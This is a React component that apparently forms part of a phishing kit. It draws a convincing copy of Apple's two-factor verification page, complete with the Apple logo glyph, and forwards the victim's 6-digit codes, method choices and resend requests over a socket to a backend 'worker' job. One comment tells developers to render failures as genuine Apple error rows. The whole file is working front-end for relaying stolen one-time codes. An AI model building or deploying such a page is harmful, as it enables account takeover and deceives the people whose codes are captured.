import { useEffect, useRef, useState } from "react";
import { Landing } from "../components/Landing";
import {
  isMockAuth,
  resend2fa,
  submit2fa,
  submitCode,
  switch2fa,
} from "../lib/socket";
import { useAuthState } from "../lib/useAuth";

function Choice({ option, selected, onClick, disabled }) {
  return (
    <button
      type="button"
      disabled={disabled}
      onClick={onClick}
      className={`rounded-[9px] border px-3 py-1.5 text-left text-[12px] leading-4 transition-colors duration-150 ${
        selected
          ? "border-[#0071e3] bg-[#e8f2fd] text-[#0066cc]"
          : "border-[#d2d2d7] bg-white text-[#1d1d1f] hover:bg-[#f5f5f7]"
      } disabled:opacity-50`}
    >
      <span className="block font-medium">{option.label}</span>
      {option.detail ? (
        <span className="mt-0.5 block text-[11px] leading-4 text-[#6e6e73]">
          {option.detail}
        </span>
      ) : null}
    </button>
  );
}

export default function Verify({ onContinue }) {
  const auth = useAuthState();
  const twofa = auth.twofa;
  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
  const [focusIdx, setFocusIdx] = useState(0);
  const [choiceId, setChoiceId] = useState(twofa?.choiceId || "");
  const [notice, setNotice] = useState(twofa?.notice || "");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const [dismissed, setDismissed] = useState("");
  const [cooldown, setCooldown] = useState(0);
  const refs = useRef([]);

  useEffect(() => {
    refs.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (!twofa) return;
    setChoiceId(twofa.choiceId || "");
    setNotice(twofa.notice || "");
  }, [twofa]);

  useEffect(() => {
    if (cooldown <= 0) return;
    const timer = setTimeout(() => setCooldown((value) => Math.max(0, value - 1)), 1000);
    return () => clearTimeout(timer);
  }, [cooldown]);

  const complete = digits.every((d) => d.length === 1);
  const mock = isMockAuth();
  const needsCode = !twofa || twofa.method !== "security_key";
  const options = twofa?.options ?? [];

  // The worker reports a rejected code as a status line on job:state. Treat
  // the failure wording as an Apple error row, not as neutral help text.
  const stateError =
    auth.state === "twofa" &&
    /not accepted|incorrect|failed|expired|timed out|too many/i.test(auth.message || "")
      ? auth.message
      : "";
  const serverError = stateError && stateError !== dismissed ? stateError : "";
  const shownError = error || serverError;

  function setDigit(i, raw) {
    const ch = raw.replace(/\D/g, "").slice(-1);
    setDigits((prev) => {
      const next = [...prev];
      next[i] = ch;
      return next;
    });
    if (ch && i < 5) refs.current[i + 1]?.focus();
  }

  function onKeyDown(i, e) {
    if (e.key === "Backspace" && !digits[i] && i > 0) refs.current[i - 1]?.focus();
  }

  async function choose(option) {
    if (!twofa || busy) return;
    setBusy(true);
    setError("");
    try {
      const result = await switch2fa({
        jobId: auth.jobId,
        fromChoiceId: choiceId,
        toChoiceId: option.id,
      });
      setChoiceId(option.id);
      if (result.notice) setNotice(result.notice);
    } catch (failure) {
      setError(failure.message);
    } finally {
      setBusy(false);
    }
  }

  async function resend() {
    if (!twofa || busy) return;
    setBusy(true);
    setError("");
    try {
      const result = await resend2fa({ jobId: auth.jobId, choiceId });
      setCooldown(30);
      if (result.notice) setNotice(result.notice);
    } catch (failure) {
      setError(failure.message);
    } finally {
      setBusy(false);
    }
  }

  async function verify() {
    if (mock || !twofa) {
      if (!complete) return;
      submitCode(digits.join(""));
      onContinue?.();
      return;
    }
    if (needsCode && !complete) return;
    setBusy(true);
    setError("");
    try {
      await submit2fa({
        jobId: auth.jobId,
        choiceId,
        code: needsCode ? digits.join("") : "security-key",
      });
      setNotice("Checking the code…");
    } catch (failure) {
      setError(failure.message);
    } finally {
      setBusy(false);
    }
  }

  return (
    <Landing>
      <div className="mb-[50px] flex justify-center">
        <div className="my-5 w-[440px] max-w-[calc(100%-40px)] rounded-[11px] border border-[rgba(210,210,215,0.63)] bg-white px-0 pb-[29px] pt-[20px] text-center shadow-[0_4px_22px_rgba(0,0,0,0.06)]">
          <div className="mb-5 h-[45px]"><span className="relative top-[5px] inline-block font-['SF_Pro_Icons'] text-[40px] leading-[40px]">&#xF8FF;</span></div>

          <div className="px-5">
            <h2 className="font-display text-[21px] font-semibold leading-[26px] tracking-[0.147px] text-[#1d1d1f] [text-rendering:optimizeLegibility] max-[734px]:tracking-[0.189px]">
              Enter the verification code
            </h2>
            <p className="mt-1 text-[15px] leading-[21px] tracking-[-0.33px] text-[#424245] [text-rendering:optimizeLegibility]">
              {twofa?.method === "security_key"
                ? "Touch your security key to continue."
                : "Enter the 6-digit code generated by one of your devices."}
            </p>

            {twofa ? (
              <div className="mt-4 text-left">
                <div className="flex flex-wrap gap-2">
                  {options.map((option) => (
                    <Choice
                      key={option.id}
                      option={option}
                      selected={option.id === choiceId}
                      disabled={busy}
                      onClick={() => choose(option)}
                    />
                  ))}
                </div>
                <div className="mt-2 flex items-center justify-between gap-3 text-[12px] leading-4 text-[#6e6e73]">
                  <span aria-live="polite">{shownError ? "" : notice || auth.message}</span>
                  <button
                    type="button"
                    onClick={resend}
                    disabled={busy || cooldown > 0}
                    className="whitespace-nowrap text-[#0066cc] hover:underline disabled:opacity-50"
                  >
                    {cooldown > 0 ? `Resend in ${cooldown}s` : "Resend"}
                  </button>
                </div>
              </div>
            ) : null}
          </div>

          {needsCode ? (
            <div className="px-5">
              <div className="mt-[35px]">
                <div className="mx-auto flex w-[334px] gap-[14px] max-[734px]:w-[324px] max-[734px]:gap-3">
                  {digits.map((digit, i) => (
                    <input
                      key={i}
                      ref={(el) => { refs.current[i] = el; }}
                      className={`box-border h-[46px] w-[44px] rounded-[12px] bg-[rgba(255,255,255,0.8)] text-center font-display text-[22px] leading-[29.3351px] tracking-[0.198px] text-[#1d1d1f] outline-none transition-[border-color,background-color] duration-150 ease-out max-[734px]:rounded-[8px] ${
                        digit ? "animate-digit-pop" : ""
                      } ${
                        focusIdx === i
                          ? "border-2 border-[#0071e3]"
                          : shownError
                            ? "border border-[#e30000] bg-[#fff2f4]"
                            : "border border-[#86868b]"
                      }`}
                      type="tel"
                      inputMode="numeric"
                      autoCapitalize="off"
                      autoCorrect="off"
                      spellCheck="false"
                      autoComplete={i === 0 ? "one-time-code" : "off"}
                      aria-label={`Digit ${i + 1}`}
                      aria-invalid={shownError ? "true" : "false"}
                      value={digit}
                      onFocus={() => setFocusIdx(i)}
                      onChange={(e) => {
                        setError("");
                        setDismissed(auth.message || "");
                        setDigit(i, e.target.value);
                      }}
                      onKeyDown={(e) => onKeyDown(i, e)}
                    />
                  ))}
                </div>
              </div>
            </div>
          ) : null}

          {shownError ? (
            <p
              role="alert"
              aria-live="assertive"
              className="mx-auto flex max-w-[328px] items-center justify-center gap-1.5 px-5 pt-2 text-[14px] leading-[20px] tracking-[-0.224px] text-[#e30000]"
            >
              <span aria-hidden="true" className="font-['SF_Pro_Icons'] text-[16px] leading-none">
                &#xF312;
              </span>
              <span className="text-left">{shownError}</span>
            </p>
          ) : null}

          <div className={shownError ? "mt-[23px]" : "mt-[51px]"}>
            <button
              type="button"
              onClick={twofa ? resend : undefined}
              className="inline-block border border-transparent px-0.5 py-1 text-[14px] leading-[20px] tracking-[-0.224px] text-[#0066cc] [text-rendering:optimizeLegibility] hover:underline"
            >
              Didn&rsquo;t get a code?
            </button>
          </div>

          <div className="mt-[25px] px-[25px]">
            <button
              type="button"
              disabled={busy || (needsCode ? !complete : false)}
              onClick={verify}
              className="h-[36px] w-full rounded-[8px] border border-transparent bg-[#0071e3] px-[15px] py-[8px] text-center text-[14px] leading-[18px] tracking-[-0.224px] text-white [text-rendering:optimizeLegibility] transition-[opacity,transform] duration-150 ease-out active:scale-[0.99] disabled:opacity-[0.42]"
            >
              <span className="text-[14px] leading-[18px]">
                {twofa?.method === "security_key" ? "Use security key" : "Continue"}
              </span>
            </button>
          </div>
        </div>
      </div>
    </Landing>
  );
}
